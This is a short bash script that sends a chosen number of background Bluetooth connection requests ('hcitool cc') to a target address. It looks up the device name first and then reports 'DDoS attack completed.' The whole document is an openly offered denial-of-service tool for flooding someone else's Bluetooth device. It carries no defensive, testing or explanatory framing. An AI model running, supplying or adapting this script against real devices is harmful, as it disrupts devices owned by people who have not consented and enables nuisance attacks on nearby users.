#!/bin/bash

# Function to get the username associated with a Bluetooth address
get_username() {
    local address="$1"
    local name=$(hcitool name "$address" 2>/dev/null)
    if [ -n "$name" ]; then
        echo "$name ($address)"
    else
        echo "Unknown Device ($address)"
    fi
}

# Check if target address and number of requests are provided
if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_address> <num_requests>"
    exit 1
fi

# Assign input parameters to variables
TARGET_ADDRESS="$1"
NUM_REQUESTS="$2"

# Run a loop to send connection requests
for ((i = 0; i < NUM_REQUESTS; i++)); do
    username=$(get_username "$TARGET_ADDRESS")
    echo "Sending connection request to: $username"
    hcitool cc "$TARGET_ADDRESS" >/dev/null 2>&1 &
done

echo "DDoS attack completed."
